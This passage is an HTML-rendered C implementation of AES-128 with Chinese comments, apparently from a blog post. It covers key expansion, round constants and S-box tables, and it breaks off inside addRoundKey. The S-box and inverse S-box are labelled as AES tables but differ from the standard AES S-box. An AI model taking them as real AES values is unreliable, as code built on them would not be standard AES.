class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>]; <span class="comment">// encKey, decKey</span></span><br><span class="line">  <span class="type">int</span> Nr;                  <span class="comment">// 10 rounds</span></span><br><span class="line">&#125; AesKey;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCKSIZE 16 <span class="comment">// AES-128分组长度为16字节</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint8_t y[4] -&gt; uint32_t x</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y)                                                             \</span></span><br><span class="line"><span class="meta">  do                                                                              \</span></span><br><span class="line"><span class="meta">  &#123;                                                                               \</span></span><br><span class="line"><span class="meta">    (x) = ((uint32_t)((y)[0] &amp; 0xff) &lt;&lt; 24) | ((uint32_t)((y)[1] &amp; 0xff) &lt;&lt; 16) | \</span></span><br><span class="line"><span class="meta">          ((uint32_t)((y)[2] &amp; 0xff) &lt;&lt; 8) | ((uint32_t)((y)[3] &amp; 0xff));         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x -&gt; uint8_t y[4]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y)                      \</span></span><br><span class="line"><span class="meta">  do                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                         \</span></span><br><span class="line"><span class="meta">    (y)[0] = (uint8_t)(((x) &gt;&gt; 24) &amp; 0xff); \</span></span><br><span class="line"><span class="meta">    (y)[1] = (uint8_t)(((x) &gt;&gt; 16) &amp; 0xff); \</span></span><br><span class="line"><span class="meta">    (y)[2] = (uint8_t)(((x) &gt;&gt; 8) &amp; 0xff);  \</span></span><br><span class="line"><span class="meta">    (y)[3] = (uint8_t)((x) &amp; 0xff);         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从uint32_t x中提取从低位开始的第n个字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥扩展中的SubWord(RotWord(temp),字节替换然后循环左移1位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x循环左移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n) (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32 - (n))))</span></span><br><span class="line"><span class="comment">// uint32_t x循环右移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n) (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32 - (n))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-128轮常量,无符号长整型</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> rcon[<span class="number">10</span>] = &#123;</span><br><span class="line">    <span class="number">0x01000000UL</span>, <span class="number">0x02000000UL</span>, <span class="number">0x04000000UL</span>, <span class="number">0x08000000UL</span>, <span class="number">0x10000000UL</span>,</span><br><span class="line">    <span class="number">0x20000000UL</span>, <span class="number">0x40000000UL</span>, <span class="number">0x80000000UL</span>, <span class="number">0x1B000000UL</span>, <span class="number">0x36000000UL</span>&#125;;</span><br><span class="line"><span class="comment">// S盒</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123;<span class="number">32</span>, <span class="number">123</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">215</span>, <span class="number">74</span>, <span class="number">205</span>, <span class="number">50</span>, <span class="number">209</span>, <span class="number">236</span>, <span class="number">243</span>, <span class="number">129</span>, <span class="number">165</span>, <span class="number">137</span>, <span class="number">14</span>, <span class="number">145</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">233</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">245</span>, <span class="number">70</span>, <span class="number">252</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">182</span>, <span class="number">172</span>, <span class="number">155</span>, <span class="number">185</span>, <span class="number">38</span>, <span class="number">9</span>, <span class="number">230</span>, <span class="number">64</span>, <span class="number">212</span>, <span class="number">176</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">156</span>, <span class="number">62</span>, <span class="number">231</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">136</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">92</span>, <span class="number">211</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">171</span>, <span class="number">86</span>, <span class="number">192</span>, <span class="number">4</span>, <span class="number">41</span>, <span class="number">208</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">249</span>, <span class="number">163</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">138</span>, <span class="number">132</span>, <span class="number">22</span>, <span class="number">244</span>, <span class="number">26</span>, <span class="number">234</span>, <span class="number">100</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">46</span>, <span class="number">190</span>, <span class="number">47</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">224</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">34</span>, <span class="number">143</span>, <span class="number">159</span>, <span class="number">203</span>, <span class="number">168</span>, <span class="number">44</span>, <span class="number">103</span>, <span class="number">52</span>, <span class="number">37</span>, <span class="number">213</span>, <span class="number">255</span>, <span class="number">239</span>, <span class="number">246</span>, <span class="number">226</span>, <span class="number">170</span>, <span class="number">217</span>, <span class="number">114</span>, <span class="number">254</span>, <span class="number">206</span>, <span class="number">161</span>, <span class="number">120</span>, <span class="number">133</span>, <span class="number">150</span>, <span class="number">42</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">193</span>, <span class="number">55</span>, <span class="number">116</span>, <span class="number">162</span>, <span class="number">94</span>, <span class="number">108</span>, <span class="number">253</span>, <span class="number">184</span>, <span class="number">77</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">179</span>, <span class="number">221</span>, <span class="number">207</span>, <span class="number">113</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">248</span>, <span class="number">25</span>, <span class="number">72</span>, <span class="number">227</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">61</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">152</span>, <span class="number">229</span>, <span class="number">128</span>, <span class="number">189</span>, <span class="number">188</span>, <span class="number">130</span>, <span class="number">198</span>, <span class="number">148</span>, <span class="number">1</span>, <span class="number">228</span>, <span class="number">222</span>, <span class="number">6</span>, <span class="number">80</span>, <span class="number">149</span>, <span class="number">223</span>, <span class="number">71</span>, <span class="number">247</span>, <span class="number">144</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">154</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">173</span>, <span class="number">28</span>, <span class="number">53</span>, <span class="number">131</span>, <span class="number">104</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">91</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">197</span>, <span class="number">16</span>, <span class="number">124</span>, <span class="number">216</span>, <span class="number">106</span>, <span class="number">204</span>, <span class="number">105</span>, <span class="number">142</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">57</span>, <span class="number">180</span>, <span class="number">160</span>, <span class="number">11</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">169</span>, <span class="number">178</span>, <span class="number">140</span>, <span class="number">10</span>, <span class="number">191</span>, <span class="number">40</span>, <span class="number">134</span>, <span class="number">109</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">65</span>, <span class="number">250</span>, <span class="number">117</span>, <span class="number">181</span>, <span class="number">67</span>, <span class="number">195</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">43</span>, <span class="number">85</span>, <span class="number">242</span>, <span class="number">158</span>, <span class="number">45</span>, <span class="number">18</span>, <span class="number">35</span>, <span class="number">13</span>, <span class="number">219</span>, <span class="number">107</span>, <span class="number">199</span>, <span class="number">56</span>, <span class="number">127</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">8</span>, <span class="number">237</span>, <span class="number">225</span>, <span class="number">187</span>, <span class="number">238</span>, <span class="number">157</span>, <span class="number">210</span>, <span class="number">146</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">220</span>, <span class="number">88</span>, <span class="number">135</span>, <span class="number">194</span>, <span class="number">186</span>, <span class="number">153</span>, <span class="number">201</span>, <span class="number">78</span>, <span class="number">241</span>, <span class="number">33</span>, <span class="number">235</span>, <span class="number">19</span>, <span class="number">101</span>, <span class="number">89</span>, <span class="number">118</span>, <span class="number">12</span>, <span class="number">200</span>, <span class="number">5</span>, <span class="number">164</span>, <span class="number">84</span>, <span class="number">147</span>, <span class="number">27</span>, <span class="number">102</span>, <span class="number">17</span>, <span class="number">39</span>, <span class="number">83</span>, <span class="number">126</span>, <span class="number">15</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆S盒</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[<span class="number">256</span>] = &#123;<span class="number">64</span>, <span class="number">143</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">56</span>, <span class="number">245</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">188</span>, <span class="number">182</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">159</span>, <span class="number">168</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">209</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">190</span>, <span class="number">57</span>, <span class="number">106</span>, <span class="number">203</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">90</span>, <span class="number">160</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">132</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">35</span>, <span class="number">195</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">226</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">235</span>, <span class="number">39</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">247</span>, <span class="number">204</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">52</span>, <span class="number">165</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">114</span>, <span class="number">192</span>, <span class="number">156</span>, <span class="number">164</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">140</span>, <span class="number">161</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">65</span>, <span class="number">153</span>, <span class="number">187</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">142</span>, <span class="number">148</span>, <span class="number">105</span>, <span class="number">217</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">223</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">181</span>, <span class="number">102</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">185</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">193</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">186</span>, <span class="number">120</span>, <span class="number">180</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">55</span>, <span class="number">109</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">141</span>, <span class="number">213</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">174</span>, <span class="number">8</span>, <span class="number">101</span>, <span class="number">122</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">224</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">172</span>, <span class="number">98</span>, <span class="number">194</span>, <span class="number">211</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">144</span>, <span class="number">136</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">11</span>, <span class="number">219</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">205</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">126</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">100</span>, <span class="number">93</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy in[16] to state[4][4] */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">loadStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[j][i] = *in++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy state[4][4] to out[16] */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">storeStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">uint8_t</span> *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      *out++ = state[j][i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥扩展，只接受16字初始密钥</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, AesKey *aesKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == aesKey)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion param is NULL\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (keyLen != <span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion keyLen = %d, Not support.\n&quot;</span>, keyLen);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> *w = aesKey-&gt;eK; <span class="comment">// 加密密钥</span></span><br><span class="line">  <span class="type">uint32_t</span> *v = aesKey-&gt;dK; <span class="comment">// 解密密钥</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 扩展密钥长度44=4*(10+1)个字,原始密钥128位，4个32位字，Nb*(Nr+1)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* W[0-3],前4个字为原始密钥 */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOAD32H</span>(w[i], key + <span class="number">4</span> * i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* W[4-43] */</span></span><br><span class="line">  <span class="comment">// temp=w[i-1];tmp=SubWord(RotWord(temp))xor Rcon[i/4] xor w[i-Nk]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ <span class="built_in">MIX</span>(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">    w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">    w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">    w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">    w += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  w = aesKey-&gt;eK + <span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// 解密密钥矩阵为加密密钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密密钥</span></span><br><span class="line">  <span class="comment">// 即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      v[i] = w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    w -= <span class="number">4</span>;</span><br><span class="line">    v += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮密钥加</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">addRoundKey</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* i: row, j: col */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  